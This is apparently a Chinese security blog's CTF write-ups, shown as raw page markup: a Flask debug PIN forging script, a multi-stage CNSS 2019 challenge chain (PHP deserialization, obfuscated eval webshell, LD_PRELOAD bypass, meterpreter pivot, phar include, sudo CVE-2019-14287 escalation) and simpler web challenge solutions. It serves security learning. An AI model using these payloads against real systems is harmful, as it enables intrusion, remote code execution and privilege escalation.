class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows we can use winreg to get the machine guid</span></span><br><span class="line">        wr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(</span><br><span class="line">                    wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">"SOFTWARE\\Microsoft\\Cryptography"</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    wr.KEY_READ | wr.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    machineGuid, wrType = wr.QueryValueEx(rk, <span class="string">"MachineGuid"</span>)</span><br><span class="line">                    <span class="keyword">if</span> wrType == wr.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = rv = _generate()</span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin_and_cookie_name</span><span class="params">(app)</span>:</span></span><br><span class="line">    <span class="string">"""Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    pin = os.environ.get(<span class="string">"WERKZEUG_DEBUG_PIN"</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">"off"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">"-"</span>, <span class="string">""</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"-"</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = getattr(app, <span class="string">"__module__"</span>, app.__class__.__module__)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">"__name__"</span>, app.__class__.__name__),</span><br><span class="line">        getattr(mod, <span class="string">"__file__"</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [str(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b"cookiesalt"</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">"__wzd"</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b"pinsalt"</span>)</span><br><span class="line">        num = (<span class="string">"%09d"</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">"-"</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">"0"</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>从第二个函数得知，生成 <code>Flask Debug PIN</code> 共需要六个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username  # 当前用户的用户名</span><br><span class="line">modname  # flask</span><br><span class="line">getattr(app, &quot;__name__&quot;, app.__class__.__name__)  # Flask.app</span><br><span class="line">getattr(mod, &quot;__file__&quot;, None)  # flask 中 app.py 所在目录，可从报错信息中读到，一般为 python所在目录&#x2F;Lib&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br><span class="line">str(uuid.getnode())  # 网卡 MAC 地址的十进制表示，Linux 可通过读取 &#96;&#x2F;sys&#x2F;class&#x2F;net&#x2F;网卡名称（一般为 eth0 ，虚拟机为 ens33）&#x2F;address&#96; 获得 MAC 地址</span><br><span class="line">get_machine_id()  # 不同环境读取不同文件</span><br></pre></td></tr></table></figure><p>只需获取到这六个参数，就能生成 PIN ，从而 getshell ，其中 <code>machine_id</code> 由第一个函数获取，需要注意对应的环境读取不同的文件</p><h2 id="0x03-利用过程"><a href="#0x03-利用过程" class="headerlink" title="0x03 利用过程"></a>0x03 利用过程</h2><p>这里想要利用 <code>Flask Debug PIN</code> ，需要配合任意文件读取的漏洞使用，原题中使用了 urllib 库，可以通过 file 协议读取文件，获取对应参数，再从上方第二个函数中提取 PIN 的生成过程，构成如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'username'</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,  <span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'python所在目录/Lib/site-packages/flask/app.py'</span>  <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'MAC 地址十进制表示'</span>,  <span class="comment"># str(uuid.getnode())，/sys/class/net/网卡名称/address</span></span><br><span class="line">    <span class="string">'machine_id'</span>  <span class="comment"># get_machine_id()</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>通过脚本生成 PIN ，在报错界面中输入即可获取 Python console ，再通过 <code>os.popen(&#39;xxx&#39;).readlines()</code> 函数即可 getshell</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>此利用过程略显鸡肋，但对 Flask 的 Debug 模式 和 Flask Debug PIN 有了大致了解，可以在以后的学习过程中加以利用，达到更好的效果</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> Flask </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS Recruit 2019 Web Boss题 WriteUp</title>
      <link href="/2019/10/24/cnss-recruit-2019-web-boss/"/>
      <url>/2019/10/24/cnss-recruit-2019-web-boss/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-吐槽思考-for-BOSS-Get-Me-Inside"><a href="#0x00-吐槽思考-for-BOSS-Get-Me-Inside" class="headerlink" title="0x00 吐槽思考 for [BOSS] Get Me Inside"></a>0x00 <del>吐槽</del>思考 for [BOSS] Get Me Inside</h2><p>这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多<del>（原来我的肝这么好）</del><br>这是一道涉及面广泛的题，考虑到了实战的一些情况，考察多方面的知识，是一道不可多得的好题（即使如此，我依旧想暴打各位出题人emmm）</p><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><p>打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 <code>class</code> ，先暂时略过这些 <code>class</code> ，继续向下看，我们会发现在源码的末尾有这么一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'p'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="keyword">if</span>($flag === <span class="number">1</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合上边的一大堆 <code>class</code> ，考虑利用反序列化漏洞，层层递进，最终将变量 <code>flag</code> 的值设为 <code>1</code> 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?p&#x3D;O:4:&quot;Deep&quot;:2:&#123;s:2:&quot;m1&quot;;O:4:&quot;Dark&quot;:2:&#123;s:2:&quot;m1&quot;;O:7:&quot;Fantasy&quot;:2:&#123;s:2:&quot;m1&quot;;O:5:&quot;Happy&quot;:2:&#123;s:2:&quot;m1&quot;;O:8:&quot;New_year&quot;:2:&#123;s:2:&quot;s1&quot;;O:21:&quot;Copied_from_somewhere&quot;:0:&#123;&#125;s:2:&quot;s2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>输入后发现在未提供参数 <code>c</code> 的情况下输出了 <code>?</code> ，可知成功将 <code>flag</code> 设为 <code>1</code></p><h2 id="0x02-get-shell"><a href="#0x02-get-shell" class="headerlink" title="0x02 get shell"></a>0x02 get shell</h2><p>之后查看最后的一段源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'c'</span>];</span><br><span class="line"> <span class="keyword">if</span>(strlen($code)&gt;<span class="number">37</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"这么长会死的!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9^!]+/"</span>,$code))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Catch you!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考虑通过 <code>eval</code> 这个函数调用其他函数拿到系统 shell ，然而首先要面对的问题就是这个可恶的正则，你注入的代码中不能包含任何字母、数字和 <code>^</code> <code>!</code> 两种符号<br>这里可以使用 PHP 的另一种函数调用方式 <code>(函数名)(参数)</code> ，然后函数名和参数都采用按位取反的方式，通过url编码和 <code>~</code> 运算符调用函数<br>然后我们非常高兴的执行了 <code>system(&#39;whoami&#39;)</code> ，但是，什么都没有发生，看一下 <code>phpinfo()</code> ，发现几乎所有能拿到系统shell的函数都在 <code>disable_functions</code> 里，然后考虑绕过 <code>disable_functions</code> 的方法，经过多方查找，最后选择了通过 <code>LD_PRELOAD</code> 的方式绕过，但这种方法需要上传文件，所以继续构造 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?p&#x3D;O:4:%22Deep%22:2:&#123;s:2:%22m1%22;O:4:%22Dark%22:2:&#123;s:2:%22m1%22;O:7:%22Fantasy%22:2:&#123;s:2:%22m1%22;O:5:%22Happy%22:2:&#123;s:2:%22m1%22;O:8:%22New_year%22:2:&#123;s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:&#123;&#125;s:2:%22s2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;&amp;c&#x3D;(~%9e%8c%8c%9a%8d%8b)($&#123;~%a0%b8%ba%ab&#125;[%aa]);&amp;%aa&#x3D;eval($_POST[&#39;aaa&#39;]);</span><br></pre></td></tr></table></figure><p>这里我们采用另一个可以执行 PHP 语句的函数 <code>assert</code> ，但由于 <code>assert</code> 一次只能执行一条语句，我们可以在其中再加入一个 <code>eval</code> ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 <code>html</code> 目录没有写权限，故考虑另一个目录 <code>/tmp</code> ，测试后发现有写权限，故可以上传构造的 <code>so</code> 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 <code>so</code> 文件，我就直接拿来用了，后来知道那个文件<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">出自此处</a>，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 <code>include</code> 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell</p><h2 id="0x03-内网穿透"><a href="#0x03-内网穿透" class="headerlink" title="0x03 内网穿透"></a>0x03 内网穿透</h2><p>由于 hint 给出了 <code>LAN &amp; ARP</code> ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 <code>arp -a</code> 看一下，发现有这么一个 IP 与众不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0</span><br></pre></td></tr></table></figure><p><code>curl</code> 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 <code>meterpreter</code> 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删）<br>先用 <code>msfvenom</code> 做个木马，然后用蚁剑上传到服务器1，给一下执行权限，接下来在 <code>msfconsole</code> 中监听木马设置的端口，然后再服务器1中运行木马，拿到 <code>meterpreter shell</code>，然后用 <code>portfwd</code> 进行端口转发，打开转发到服务器上的端口，成功打开服务器2上的网页</p><h2 id="0x04-get-shell-Again"><a href="#0x04-get-shell-Again" class="headerlink" title="0x04 get shell Again"></a>0x04 get shell <strong>Again</strong></h2><p>打开页面，发现似乎可以上传什么东西，观察 url 有 <code>/?file=index</code> ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 <code>.php</code> ，发现成功打开上传页面，可以判断 <code>file</code> 是一个 <code>include</code> 漏洞，尝试 <code>php伪协议</code> 读取源码，构造以下 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>成功读到 <code>upload.php</code> 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ）<br>观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 <code>Phar</code> ，于是写一个一句话木马，打包成 <code>zip</code>（注意打包时选择不压缩），然后将拓展名改为 <code>png</code> ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 <code>.php</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;phar:&#x2F;&#x2F;pic&#x2F;文件名&#x2F;木马名</span><br></pre></td></tr></table></figure><p>看一下 <code>phpinfo</code> ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了）</p><h2 id="0x05-读取-flag-文件"><a href="#0x05-读取-flag-文件" class="headerlink" title="0x05 读取 flag 文件"></a>0x05 读取 flag 文件</h2><p>根据 hint ，只有 root 用户可以读取 flag 文件，尝试 <code>sudo cat</code>，发现并不能读取，<code>sudo -l</code> 看一下权限，发现权限设置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL,!root) NOPASSWD:&#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><p>直接使用 <code>sudo</code> 无法使用 <code>cat</code> ，这里我探索了接近两小时终于搜到了一个神奇的漏洞 <code>CVE-2019-14287</code> ，漏洞具体信息可以参考我好不容易搜到的的<a href="https://www.agesec.com/8369.html" target="_blank" rel="noopener">这个网站</a><br>根据这个漏洞执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 /bin/cat /flag</span></span><br></pre></td></tr></table></figure><p>成功获得 flag！！！（泪目）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNSS </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS Recruit 2019 Web WriteUp</title>
      <link href="/2019/10/24/cnss-recruit-2019-web/"/>
      <url>/2019/10/24/cnss-recruit-2019-web/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于技术有限，时间匆忙，本文可能存在各种问题。如发现问题（如思路错误、术语错误 或 我的解法凭空增加了解题难度 等），请各位 dalao 毫不犹豫的锤爆我的狗头，谢谢！</p><p>感谢 <strong>ay3</strong> 对 <code>产品经理</code> 一题解题思路的指正，感谢 dalao！</p></blockquote><h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><hr><p>web 的第一道签到题，打开就说了 hide，果断 <code>F12</code> 看源码，发现注释里有些东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--what is this : ./secret/f1ag_is_h4re.php--&gt;</span></span><br></pre></td></tr></table></figure><p>直接在url后添加 <code>/secret/f1ag_is_h4re.php</code> 进入<del>下一关</del>，这里再看源码并无收获，看一下 Cookie，发现多了一条名为 <code>interesting_string</code> 的 Cookie，查看其内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9</span><br></pre></td></tr></table></figure><p>猜测为某种编码，尝试 base64 解码，成功获取 flag</p><h2 id="True-check-in"><a href="#True-check-in" class="headerlink" title="True_check_in"></a>True_check_in</h2><hr><p>真正的签到题？打开发现是一个<del>数学题</del>，果断打开计算器算出正确答案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8589934592</span><br></pre></td></tr></table></figure><p>输入答案时发现问题，输入框有长度限制，看源码，发现最大长度为 8，而我们的答案有十位，但这里长度限制在前端，打开 Burp Suite 一通抓包改包（也可审查元素直接改maxlength），输入正确答案，成功获取 flag</p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h2><hr><p>来热个身！看到题目即想到修改 <code>header</code>，这里用到了 <code>User-Agent</code> 、 <code>X-Forwarded-For</code> 和 <code>Referer</code></p><p>首先在 <code>User-Agent</code> 中添加 cnss，或直接将其中浏览器名称改为 cnss</p><p>PS：这里应注意，不要将 UA 内容全部删除只写入 cnss，这样有可能服务器无法解析而拿不到 flag</p><p>然后添加下面两句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 233.233.233.233</span><br><span class="line">Referer: www.notcnss.com</span><br></pre></td></tr></table></figure><p>将包发出，成功获取 flag</p><h2 id="GAY’-Profile"><a href="#GAY’-Profile" class="headerlink" title="GAY’ Profile"></a>GAY’ Profile</h2><hr><p><del>一眼望去，好GAY的题</del>首先看源码，发现如下注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Why not try to get /source ? --&gt;</span></span><br></pre></td></tr></table></figure><p>果断 url 后加 <code>/source</code>，拿到源码，发现在 <code>/file</code> 中通过name参数可以读取文件，结合 hint 中所说 flag 在 <code>/flag</code> 中构造 url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>别问我为什么 flag 在上一级目录，试一试就出来了（逃，成功获取 flag</p><h2 id="love-reading"><a href="#love-reading" class="headerlink" title="love_reading"></a>love_reading</h2><hr><p>拿到这道题，只给了两句话，乍一看比较懵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil robot take my love. I only know that he uses linux.</span><br></pre></td></tr></table></figure><p>细细分析这两句话中的提示，发现 <code>robot</code> 和 <code>linux</code> 应该有作用</p><p>先尝试在 url 后添加 <code>/robots.txt</code>， 出现了 <code>s4cret.php</code>，直接修改 url，<del>惊喜的</del>发现一片空白</p><p>读 hint 发现 <code>vim in linux</code> ，眼前一亮，即想到 vim 产生的临时文件</p><p>分别尝试 <code>/.s4cret.php.swp</code> 和 <code>/.index.php.swp</code>，发现 index.php 存在临时文件，用 vim 还原，得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(!(isset($_GET[&#39;key&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;])))&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $path &#x3D; $_GET[&#39;key&#39;];</span><br><span class="line">    $data &#x3D; file_get_contents($path);</span><br><span class="line">    if($data !&#x3D; &quot;zhi ma kai men!&quot;)&#123;</span><br><span class="line">        die(&quot;no no nope&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $f &#x3D; $_GET[&#39;f&#39;];</span><br><span class="line">    include($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码不长，发现有两个参数 <code>key</code> 和 <code>f</code>，分别调用 <code>file_get_contents()</code> 和 <code>include()</code>，应从这两个地方入手，由于没有任何过滤机制，故直接考虑 PHP 伪协议</p><p>第一个参数应用自己的输入代替获取文件内容，可用 <code>php://input</code> 加 POST 传参直接绕过</p><p>第二个参数应为 <code>include()</code> 的任意文件读取，用 <code>php://filter</code> 即可</p><p>故构造以下url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 